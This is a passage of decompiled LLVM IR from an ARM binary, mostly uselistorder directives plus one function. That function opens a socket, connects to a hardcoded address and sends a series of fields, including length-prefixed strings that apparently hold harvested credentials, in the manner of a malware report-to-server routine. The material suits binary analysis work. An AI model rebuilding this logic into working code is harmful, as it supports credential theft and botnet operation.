  store i32 104, i32* %v2_119dc, align 4
  br label %dec_label_pc_11910

dec_label_pc_119e4:                               ; preds = %bb321
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_119f0 = call i32 @function_13790(i32 2, i32 1, i32 0)
  store i32 %v3_119f0, i32* %r0.global-to-local, align 4
  %v7_119f4 = icmp eq i32 %v3_119f0, -1
  store i1 %v7_119f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_119f0, i32* @r4, align 4
  br i1 %v7_119f4, label %dec_label_pc_11b1c, label %dec_label_pc_11a00

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119e4
  store i32 1674493113, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v1_11a20 = call i32 @function_11c08(i32 19)
  %v0_11a24 = load i32, i32* @r6, align 4
  store i32 %v0_11a24, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v2_11a2c = inttoptr i32 %v0_11a24 to i32*
  %v3_11a2c = call i32 @function_11b24(i32 19, i32* %v2_11a2c)
  %v4_11a2c = inttoptr i32 %v3_11a2c to i8*
  store i32 %v3_11a2c, i32* %r0.global-to-local, align 4
  %v2_11a30 = add i32 %v3_11a2c, 1
  %v3_11a30 = inttoptr i32 %v2_11a30 to i8*
  %v4_11a30 = load i8, i8* %v3_11a30, align 1
  %v5_11a30 = zext i8 %v4_11a30 to i32
  store i32 %v5_11a30, i32* %r2.global-to-local, align 4
  %v3_11a34 = load i8, i8* %v4_11a2c, align 1
  %v4_11a34 = zext i8 %v3_11a34 to i32
  %v4_11a38 = mul nuw nsw i32 %v5_11a30, 256
  %v5_11a38 = or i32 %v4_11a34, %v4_11a38
  store i32 %v5_11a38, i32* %r3.global-to-local, align 4
  store i32 %v5_11a30, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_11a4c = call i32 @function_11b50(i32 19)
  %v0_11a50 = load i32, i32* @r4, align 4
  store i32 %v0_11a50, i32* %r0.global-to-local, align 4
  %v2_11a54 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_11a54, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11a5c = bitcast i32* %stack_var_-92 to %sockaddr*
  %v4_11a5c = call i32 @function_135ec(i32 %v0_11a50, %sockaddr* %v3_11a5c, i32 16)
  store i32 %v4_11a5c, i32* %r0.global-to-local, align 4
  %v3_11a60 = icmp eq i32 %v4_11a5c, -1
  %v8_11a60 = icmp eq i32 %v4_11a5c, -1
  store i1 %v8_11a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11a60, label %dec_label_pc_11a68, label %dec_label_pc_11a78

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a00
  %v0_11a68 = load i32, i32* @r4, align 4
  store i32 %v0_11a68, i32* %r0.global-to-local, align 4
  %v1_11a6c = call i32 @function_12e9c(i32 %v0_11a68)
  %v0_11a70 = load i32, i32* @r6, align 4
  store i32 %v0_11a70, i32* %r0.global-to-local, align 4
  %v1_11a74 = call i32 @function_14230(i32 %v0_11a70)
  store i32 %v1_11a74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a00, %dec_label_pc_11a68
  store i32 %v2_11270, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11a88 = load i32, i32* @r4, align 4
  store i32 %v0_11a88, i32* %r0.global-to-local, align 4
  %v0_11a8c = load i32, i32* @r6, align 4
  store i32 %v0_11a8c, i32* %stack_var_-56, align 4
  %v6_11a90 = call i32 @function_13700(i32 %v0_11a88, i32* nonnull %stack_var_-56, i32 1, i32 16384)
  store i32 %v2_11324, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11aa4 = load i32, i32* @r4, align 4
  store i32 %v0_11aa4, i32* %r0.global-to-local, align 4
  %v5_11aa8 = call i32 @function_13700(i32 %v0_11aa4, i32* nonnull %stack_var_-48, i32 4, i32 16384)
  %v0_11ab0 = load i32, i32* @r5, align 4
  store i32 %v0_11ab0, i32* %r2.global-to-local, align 4
  %v2_11ab4 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_11ab4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11abc = load i32, i32* @r4, align 4
  store i32 %v0_11abc, i32* %r0.global-to-local, align 4
  %v5_11ac0 = call i32 @function_13700(i32 %v0_11abc, i32* nonnull %stack_var_-38, i32 %v0_11ab0, i32 16384)
  %v0_11ac4 = load i32, i32* @sl, align 4
  %v1_11ac4 = add i32 %v0_11ac4, 12
  store i32 %v1_11ac4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11ad0 = load i32, i32* @r4, align 4
  store i32 %v0_11ad0, i32* %r0.global-to-local, align 4
  %v4_11ad4 = inttoptr i32 %v1_11ac4 to i32*
  %v5_11ad4 = call i32 @function_13700(i32 %v0_11ad0, i32* %v4_11ad4, i32 1, i32 16384)
  store i32 %v5_11ad4, i32* %r0.global-to-local, align 4
  %v0_11ad8 = load i32, i32* @sl, align 4
  %v1_11ad8 = inttoptr i32 %v0_11ad8 to i32*
  %v2_11ad8 = load i32, i32* %v1_11ad8, align 4
  store i32 %v2_11ad8, i32* %r1.global-to-local, align 4
  %v1_11adc = add i32 %v0_11ad8, 12
  %v2_11adc = inttoptr i32 %v1_11adc to i8*
  %v3_11adc = load i8, i8* %v2_11adc, align 1
  %v4_11adc = zext i8 %v3_11adc to i32
  store i32 %v4_11adc, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11ae4 = load i32, i32* @r4, align 4
  store i32 %v0_11ae4, i32* %r0.global-to-local, align 4
  %v4_11ae8 = inttoptr i32 %v2_11ad8 to i32*
  %v5_11ae8 = call i32 @function_13700(i32 %v0_11ae4, i32* %v4_11ae8, i32 %v4_11adc, i32 16384)
  %v0_11aec = load i32, i32* @sl, align 4
  %v1_11aec = add i32 %v0_11aec, 13
  store i32 %v1_11aec, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11af8 = load i32, i32* @r4, align 4
  store i32 %v0_11af8, i32* %r0.global-to-local, align 4
  %v4_11afc = inttoptr i32 %v1_11aec to i32*
  %v5_11afc = call i32 @function_13700(i32 %v0_11af8, i32* %v4_11afc, i32 1, i32 16384)
  %v0_11b00 = load i32, i32* @r4, align 4
  store i32 %v0_11b00, i32* %r0.global-to-local, align 4
  %v0_11b04 = load i32, i32* @sl, align 4
  %v1_11b04 = add i32 %v0_11b04, 13
  %v2_11b04 = inttoptr i32 %v1_11b04 to i8*
  %v3_11b04 = load i8, i8* %v2_11b04, align 1
  %v4_11b04 = zext i8 %v3_11b04 to i32
  store i32 %v4_11b04, i32* %r2.global-to-local, align 4
  %v1_11b08 = add i32 %v0_11b04, 4
  %v2_11b08 = inttoptr i32 %v1_11b08 to i32*
  %v3_11b08 = load i32, i32* %v2_11b08, align 4
  store i32 %v3_11b08, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11b10 = inttoptr i32 %v3_11b08 to i32*
  %v5_11b10 = call i32 @function_13700(i32 %v0_11b00, i32* %v4_11b10, i32 %v4_11b04, i32 16384)
  %v0_11b14 = load i32, i32* @r4, align 4
  store i32 %v0_11b14, i32* %r0.global-to-local, align 4
  %v1_11b18 = call i32 @function_12e9c(i32 %v0_11b14)
  store i32 %v1_11b18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_119e4, %dec_label_pc_11a78
  %v0_11b1c = load i32, i32* @r6, align 4
  store i32 %v0_11b1c, i32* %r0.global-to-local, align 4
  %v1_11b20 = call i32 @function_14230(i32 %v0_11b1c)
  store i32 %v1_11b20, i32* %r0.global-to-local, align 4
  ret i32 %v1_11b20

; uselistorder directives
  uselistorder i32 %v5_11a30, { 1, 0, 2 }
  uselistorder i1 %v7_119f4, { 1, 0 }
  uselistorder i32 %v3_119f0, { 1, 0, 2 }
  uselistorder i32 %v3_11998, { 1, 0 }
  uselistorder i32 %v5_118e4, { 2, 0, 3, 4, 1 }
  uselistorder i1 %v2_118b0, { 1, 0 }
  uselistorder i32 %.325, { 1, 0 }
  uselistorder i1 %v7_11898, { 1, 0 }
  uselistorder i32 %v0_11894, { 2, 1, 0, 3 }
  uselistorder i32 %v4_11870, { 1, 0, 2 }
  uselistorder i1 %v7_11860, { 1, 0 }
  uselistorder i32 %v0_11860, { 3, 2, 0, 1 }
  uselistorder i32 %v0_117dc, { 1, 2, 0 }
  uselistorder i32 %v0_117a4, { 1, 2, 0 }
  uselistorder i32 %v0_11790.v1_11790, { 1, 0 }
  uselistorder i32 %v2_11790, { 1, 0 }
  uselistorder i32 %v1_11790, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11790, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 %v1_1176c, { 1, 0 }
  uselistorder i1 %v7_11734, { 1, 0 }
  uselistorder i32 %v4_11730, { 1, 0 }
  uselistorder i1 %v7_1169c, { 1, 0 }
  uselistorder i32 %v1_11698, { 2, 1, 3, 0 }
  uselistorder i1 %v8_11690, { 1, 0 }
  uselistorder i8 %v3_11688, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_11698, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_11674, { 1, 0 }
  uselistorder i1 %v7_1166c, { 1, 0 }
  uselistorder i1 %v7_11664, { 1, 0 }
  uselistorder i1 %v7_115e8, { 1, 0 }
  uselistorder i32 %v1_115e4, { 2, 1, 3, 0 }
  uselistorder i1 %v8_115dc, { 1, 0 }
  uselistorder i8 %v3_115d4, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_115e4, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_115c0, { 1, 0 }
  uselistorder i1 %v7_115b8, { 1, 0 }
  uselistorder i1 %v7_115b0, { 1, 0 }
  uselistorder i1 %v7_11534, { 1, 0 }
  uselistorder i32 %v1_11530, { 2, 1, 3, 0 }
  uselistorder i1 %v8_11528, { 1, 0 }
  uselistorder i8 %v3_11520, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_11530, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_1150c, { 1, 0 }
  uselistorder i1 %v7_11504, { 1, 0 }
  uselistorder i1 %v7_114fc, { 1, 0 }
  uselistorder i32 %v0_114a4, { 2, 1, 0 }
  uselistorder i1 %v7_1149c, { 1, 0 }
  uselistorder i1 %v8_11490, { 1, 0 }
  uselistorder i8 %v3_11488, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_11498, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_11474, { 1, 0 }
  uselistorder i1 %v7_1146c, { 1, 0 }
  uselistorder i32 %v3_11458, { 1, 0, 2, 3 }
  uselistorder i1 %v7_11308, { 1, 0 }
  uselistorder i32 %v1_11304, { 2, 1, 3, 0 }
  uselistorder i1 %v8_112fc, { 1, 0 }
  uselistorder i8 %v3_112f4, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_11304, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_112e0, { 1, 0 }
  uselistorder i1 %v7_112d8, { 1, 0 }
  uselistorder i1 %v7_112d0, { 1, 0 }
  uselistorder i1 %v7_11254, { 1, 0 }
  uselistorder i32 %v1_11250, { 2, 1, 3, 0 }
  uselistorder i1 %v8_11248, { 1, 0 }
  uselistorder i8 %v3_11240, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_11250, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_1122c, { 1, 0 }
  uselistorder i1 %v7_11224, { 1, 0 }
  uselistorder i1 %v7_1121c, { 1, 0 }
  uselistorder i32 %v0_111c4, { 2, 1, 0 }
  uselistorder i1 %v7_111bc, { 1, 0 }
  uselistorder i1 %v8_111b0, { 1, 0 }
  uselistorder i8 %v3_111a8, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_111b8, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_11194, { 1, 0 }
  uselistorder i1 %v7_1118c, { 1, 0 }
  uselistorder i1 %v7_11184, { 1, 0 }
  uselistorder i32 %v3_11170, { 2, 3, 0, 1 }
  uselistorder i32 %v0_11160.pre, { 0, 2, 1 }
  uselistorder i32 %v1_11148, { 1, 0 }
  uselistorder i32 %v1_11144, { 1, 0 }
  uselistorder i32 %v1_1113c, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v3_11138, { 1, 2, 3, 0 }
  uselistorder i32 %v0_11138, { 0, 2, 1 }
  uselistorder i1 %v7_110d8, { 1, 0 }
  uselistorder i1 %v2_110c4, { 1, 0 }
  uselistorder i32 %v2_110b4, { 0, 2, 1, 3, 4 }
  uselistorder i1 %v2_110ac, { 1, 0 }
  uselistorder i32 %v1_110cc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v1_110a0, { 3, 1, 2, 0 }
  uselistorder i32 %v1_110c8, { 1, 0 }
  uselistorder i32 %v2_110d0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1108c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_11054, { 4, 19, 5, 18, 6, 17, 7, 14, 8, 16, 9, 15, 10, 13, 3, 0, 11, 12, 20, 2, 1 }
  uselistorder i32 %v1_11030, { 1, 2, 0 }
  uselistorder i32 %v3_1102c, { 1, 0 }
  uselistorder i32 %v5_11010, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 %v2_10ffc, { 1, 0, 2 }
  uselistorder i32 %v3_10ff8, { 1, 0, 2 }
  uselistorder i32 %v0_11958, { 1, 0, 2 }
  uselistorder i32 %v5_10fc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_10fa4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_10f68, { 1, 0 }
  uselistorder i32 %v1_10ee0, { 1, 0 }
  uselistorder i1 %v7_10ec0, { 1, 0 }
  uselistorder i32 %v3_10ebc, { 4, 2, 1, 0, 5, 3 }
  uselistorder i32 %v0_10eb0, { 1, 0 }
  uselistorder i32 %v1_10e94, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10e80, { 1, 0 }
  uselistorder i32 %v0_10e80, { 1, 0 }
  uselistorder i32 %v2_11324, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11270, { 4, 3, 2, 5, 6, 7, 1, 0 }
  uselistorder i32 %v2_117d0, { 1, 2, 0 }
  uselistorder i32 %v1_10da4, { 1, 0 }
  uselistorder i1 %v7_10d6c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_10d64, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v0_10d5c, { 1, 0 }
  uselistorder i32 %v1_10d40, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10d24, { 1, 0 }
  uselistorder i32 %v3_10d88, { 4, 6, 5, 1, 0, 8, 3, 2, 7 }
  uselistorder i32 %storemerge203, { 1, 0, 2 }
  uselistorder i32 %v2_10d94, { 0, 4, 1, 5, 2, 7, 3, 6 }
  uselistorder i32 %v3_10c78, { 1, 0 }
  uselistorder i32 %v1_10c5c, { 1, 0 }
  uselistorder i32 %v1_10c44, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10c50, { 1, 2, 0 }
  uselistorder i32 %v0_10c14, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32 %v2_10c08, { 1, 0 }
  uselistorder i32 %v1_10be8, { 3, 1, 4, 0, 2, 5 }
  uselistorder i1 %v2_10bc0, { 1, 0 }
  uselistorder i32 %v4_10b74, { 4, 6, 0, 1, 3, 2, 5 }
  uselistorder i32 %v1_10ae4, { 1, 0, 2, 3 }
  uselistorder i1 %v2_1097c, { 1, 0 }
  uselistorder i1 %v3_10960, { 1, 0 }
  uselistorder i1 %v2_1094c, { 1, 0 }
  uselistorder i1 %v2_10928, { 1, 0 }
  uselistorder i32 %v1_108d8, { 0, 13, 1, 12, 14, 2, 11, 3, 10, 4, 9, 5, 8, 7, 6 }
  uselistorder i32 %v1_108c4, { 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 14, 15, 13, 12, 11, 10, 9, 8, 7, 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v0_108c0, { 4, 5, 6, 0, 1, 2, 3, 7 }
  uselistorder i32 %v4_108b0, { 1, 0 }
  uselistorder i32 %v0_108a0, { 0, 2, 1 }
  uselistorder i8* %stack_var_-1876.0, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_10c04, { 0, 1, 2, 4, 5, 7, 9, 3, 6, 8, 10 }
  uselistorder i32 %v3_10580, { 1, 0 }
  uselistorder i32 %v1_10578, { 1, 0 }
  uselistorder i32 %v3_10538, { 1, 0 }
  uselistorder i32 %v4_10524, { 1, 0 }
  uselistorder i32 %v0_1050c, { 0, 2, 1 }
  uselistorder i32 %v0_104ac, { 4, 2, 0, 3, 1 }
  uselistorder i1 %v7_1044c, { 1, 0 }
  uselistorder i32 %v3_10444, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_1042c, { 0, 2, 1 }
  uselistorder i32 %v0_103e8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge210, { 1, 0 }
  uselistorder i32 %v0_1037c, { 3, 1, 2, 0, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 18, 16, 17 }
  uselistorder i32* %stack_var_-92, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 4, 5, 3, 6, 2, 7, 0, 8, 9 }
  uselistorder i32* %stack_var_-56, { 0, 6, 7, 4, 8, 5, 9, 3, 10, 2, 11, 1, 12, 13 }
  uselistorder i32* %stack_var_-38, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 4, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 26, 27, 28, 29, 30, 31, 32, 33, 34, 65, 4, 66, 67, 68, 69, 53, 18, 35, 36, 37, 5, 6, 7, 8, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 0, 1, 19, 20, 21, 2, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 70, 71, 72, 73, 74, 75, 22, 23, 76, 77, 78, 79, 80, 81, 83, 85, 84, 82, 86, 87, 88, 89, 90, 95, 91, 92, 93, 97, 96, 24, 99, 98, 25, 100, 102, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 121, 124, 123, 94, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139 }
  uselistorder i32* %r2.global-to-local, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 40, 41, 33, 19, 20, 21, 22, 23, 1, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 5, 6, 3, 4, 42, 43, 44, 45, 46, 7, 8, 47, 48, 49, 50, 51, 52, 53, 55, 57, 56, 54, 58, 59, 60, 61, 62, 63, 68, 64, 65, 66, 67, 71, 69, 72, 70, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143 }
  uselistorder i32* %r1.global-to-local, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 2, 52, 40, 20, 21, 22, 144, 145, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 4, 5, 6, 3, 0, 53, 54, 55, 56, 57, 58, 7, 59, 60, 64, 61, 62, 63, 65, 66, 69, 70, 8, 67, 68, 71, 72, 73, 74, 76, 75, 143, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142 }
  uselistorder i32* %r0.global-to-local, { 20, 19, 22, 21, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 36, 35, 38, 37, 39, 41, 40, 119, 120, 118, 42, 3, 5, 4, 121, 122, 124, 125, 123, 92, 91, 44, 43, 45, 47, 46, 48, 50, 49, 51, 6, 9, 53, 54, 55, 56, 57, 52, 58, 59, 60, 61, 63, 62, 65, 64, 67, 66, 68, 69, 70, 71, 73, 72, 75, 74, 77, 76, 78, 79, 80, 81, 83, 82, 85, 84, 87, 86, 88, 89, 90, 94, 93, 98, 95, 96, 97, 100, 99, 101, 103, 102, 105, 104, 106, 107, 108, 109, 111, 110, 113, 112, 115, 114, 116, 117, 0, 11, 10, 13, 12, 1, 2, 8, 7, 133, 126, 15, 14, 16, 141, 127, 128, 205, 129, 130, 131, 132, 134, 135, 137, 136, 139, 138, 145, 140, 142, 143, 144, 18, 146, 148, 149, 147, 17, 150, 151, 220, 152, 153, 155, 154, 156, 157, 158, 160, 159, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 206, 208, 207, 210, 209, 211, 215, 212, 213, 214, 216, 217, 219, 218 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %ip.global-to-local, { 8, 23, 24, 9, 2, 20, 10, 11, 13, 12, 15, 14, 16, 17, 18, 19, 22, 21, 0, 6, 1, 7, 3, 4, 5, 25, 41, 42, 26, 27, 28, 31, 32, 29, 30, 33, 34, 35, 36, 37, 38, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i1* %cpsr_z.global-to-local, { 46, 47, 104, 105, 106, 81, 48, 179, 49, 50, 51, 13, 14, 15, 16, 17, 32, 52, 53, 54, 55, 60, 61, 56, 57, 58, 59, 62, 63, 64, 69, 70, 65, 66, 67, 68, 71, 72, 73, 78, 79, 74, 75, 76, 77, 80, 82, 83, 87, 88, 84, 85, 86, 89, 90, 91, 96, 97, 92, 93, 94, 95, 98, 99, 100, 2, 3, 101, 102, 103, 1, 4, 34, 5, 10, 11, 6, 7, 8, 9, 12, 33, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 107, 108, 109, 110, 111, 112, 45, 38, 35, 36, 113, 114, 115, 117, 119, 118, 39, 116, 120, 121, 122, 123, 124, 129, 125, 126, 127, 128, 42, 43, 40, 41, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 178, 160, 161, 162, 163, 164, 177, 165, 166, 167, 176, 168, 169, 170, 171, 172, 173, 174, 0, 175, 180, 181, 182, 44, 183 }
  uselistorder i32 1674493113, { 1, 0 }
  uselistorder i32 104, { 0, 3, 1, 4, 2, 5 }
  uselistorder i8 31, { 7, 1, 2, 0, 3, 4, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32)* @function_11b50, { 16, 15, 14, 13, 12, 11, 10, 9, 38, 39, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_11b24, { 25, 26, 27, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59 }
  uselistorder i32 (i32)* @function_11c08, { 27, 26, 25, 24, 23, 22, 21, 20, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_15750.34 to i32*), { 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), { 16, 17, 18, 19, 20, 21, 22, 12, 23, 3, 24, 15, 25, 13, 26, 14, 27, 0, 28, 1, 29, 2, 30, 4, 31, 5, 32, 6, 33, 7, 34, 8, 35, 9, 36, 10, 37, 11, 38 }
  uselistorder i8 58, { 6, 5, 4, 1, 3, 2, 0, 7, 8 }
  uselistorder i8 62, { 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i8 37, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 35, { 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i8 36, { 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_13700, { 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 2, 3, 1, 4, 5, 6, 7, 8, 9, 29 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -4, { 2, 0, 1 }
  uselistorder i8 -3, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_136a0, { 5, 0, 1, 2, 3, 4, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @function_125a0, { 20, 22, 21, 24, 23, 19, 18, 17, 0, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @function_13644, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_130bc, { 1, 2, 0 }
  uselistorder i32 284, { 1, 2, 0, 3 }
  uselistorder i32 1536, { 1, 0 }
  uselistorder i32 1664, { 2, 0, 1 }
  uselistorder i32 ()* @function_100f8, { 3, 2, 1, 0 }
  uselistorder i8 2, { 0, 2, 4, 3, 1 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @function_136cc, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @function_1372c, { 6, 0, 1, 2, 3, 8, 4, 5, 7 }
  uselistorder i32 16384, { 31, 48, 32, 49, 33, 50, 34, 51, 35, 52, 36, 53, 13, 54, 12, 67, 0, 55, 1, 56, 2, 57, 3, 58, 4, 59, 5, 60, 29, 61, 30, 62, 6, 63, 7, 64, 8, 65, 9, 66, 27, 69, 28, 70, 26, 68, 37, 87, 10, 88, 11, 89, 15, 71, 40, 72, 39, 73, 41, 74, 42, 75, 14, 76, 38, 77, 16, 78, 17, 79, 18, 80, 43, 44, 19, 81, 20, 82, 22, 83, 21, 84, 23, 85, 24, 86, 46, 90, 47, 91, 25, 92, 45, 93 }
  uselistorder i32 (i32, i32, i32, i32)* @function_e480, { 2, 8, 7, 6, 5, 0, 4, 3, 1 }
  uselistorder i32 (i32, i32)* @function_e424, { 3, 10, 9, 8, 7, 0, 6, 5, 4, 2, 1 }
  uselistorder i32 16711680, { 3, 0, 1, 2 }
  uselistorder i32 223, { 3, 0, 1, 2 }
  uselistorder i32 126, { 10, 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 127, { 0, 6, 1, 7, 4, 8, 2, 9, 3, 10, 5, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_158a8.267 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1599c.257 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_15984.249 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_15964.243 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_15950.239 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_15948.237 to i32), { 0, 4, 1, 2, 3, 5 }
